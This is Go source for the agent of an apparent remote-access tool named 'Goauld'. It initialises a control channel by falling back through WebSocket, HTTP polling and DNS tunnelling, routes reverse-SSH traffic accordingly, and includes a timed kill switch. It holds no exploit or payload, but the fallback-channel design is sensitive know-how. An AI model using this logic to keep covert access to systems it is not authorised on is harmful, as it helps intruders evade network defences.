package main

import (
	"Goauld/agent/config"
	globalcontext "Goauld/agent/context"
	"Goauld/agent/control"
	"Goauld/agent/ssh/transport"
	"Goauld/common/log"
	"context"
	"os"
	"os/signal"
	"time"
)

func InitControl(ctx context.Context, dnsTransport *transport.DNSSH, globalCanceler *globalcontext.GlobalCanceler, configDone chan string, controlErr chan error) (bool, *control.ControlPlanClient) {
	// Define the different strategies to initialize the control socket
	//  Currently, all strategies are tried in order.
	socketOrder := []string{
		"Websocket",
		"Upgrade",
		"Polling",
		"DNS",
	}
	controlInitStrategy := map[string]control.InitStrategy{
		"Websocket": {
			Name: "Websocket",
			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
				return client.InitWs(success, chanErr)
			},
		},
		"Upgrade": {
			Name: "Upgrade",
			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
				return client.InitWsUpgrade(success, chanErr)
			},
		},
		"Polling": {
			Name: "Polling",
			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
				return client.InitPolling(success, chanErr)
			},
		},
		"DNS": {
			Name: "DNS",
			InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
				if !dnsTransport.Started {
					err := dnsTransport.Start()
					if err != nil {
						return err
					}
				}

				err := client.InitOverDNS(dnsTransport.ControlStream, success, chanErr)
				if err != nil {
					return err
				}

				// As the  control socket is established using DNS we consider that the only working protocol is DNS
				// so we set the RSSH protocol order to only DNS
				config.Get().SetRSSHOrder([]string{"DNS"})

				return nil
			},
		},
	}

	if config.Get().UseRelay() {
		config.Get().SetRSSHOrder([]string{"ws"})

		config.Get().SetRelayServerAsTarget()
	}

	order := config.Get().GetRSSHOrder()
	if len(order) == 1 {
		if order[0] == "dns" {
			socketOrder = []string{"DNS"}
		}
		if order[0] == "http" {
			socketOrder = []string{"Polling"}
		}
		if order[0] == "ws" {
			socketOrder = []string{"Websocket"}
		}
	}

	var controlPlanClient *control.ControlPlanClient
	success := false
	// We iterate over the different strategies to initialize the control socket
	// If the initialization is successful, we stop the loop
	controlMode := ""
	for _, socket := range socketOrder {
		initializer, ok := controlInitStrategy[socket]
		if !ok {
			continue
		}
		log.Info().Str("ControlMode", initializer.Name).Msg("Trying to connect to the control socket")
		cpc, err := control.Init(ctx, globalCanceler, configDone, controlErr, initializer.InitFunc)
		if err == nil {
			log.Info().Str("SocketMode", initializer.Name).Msg("Control plan started")
			success = true
			controlPlanClient = cpc
			controlMode = initializer.Name

			break
		}
		log.Error().Err(err).Str("ControlMode", initializer.Name).Msg("error initializing the control plan")
	}

	config.Get().ControlTunnelMode = controlMode

	return success, controlPlanClient
}

// HandleCtrlC intercepts the ctrl-c events.
// It signals to close all running goroutines and wait one second to allow the agent to signal the disconnection
// to the server. Then it exits.
func HandleCtrlC(controlPlanClient *control.ControlPlanClient, canceler *globalcontext.GlobalCanceler) func() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		for sig := range c {
			log.Info().Str("signal", sig.String()).Msg("received signal")
			log.Info().Msg("Shutting down control plan")
			canceler.Exit("ctrl-c signal received")
			controlPlanClient.Close()
		}
	}()

	return func() {
		signal.Stop(c)
	}
}

func KillSwitchLoop(days int, globalCanceler *globalcontext.GlobalCanceler) time.Duration {
	if days == 0 {
		return 0
	}
	d := time.Duration(days*24) * time.Hour
	go func() {
		log.Debug().Int("Days", days).Time("Kill Time", time.Now().Add(d)).Msg("Killing switch")
		t := time.NewTimer(d)
		defer t.Stop()
		<-t.C
		if globalCanceler != nil {
			globalCanceler.Exit("Kill switch activated")
		}
		time.Sleep(3 * time.Second)
		os.Exit(4)
	}()

	return d
}
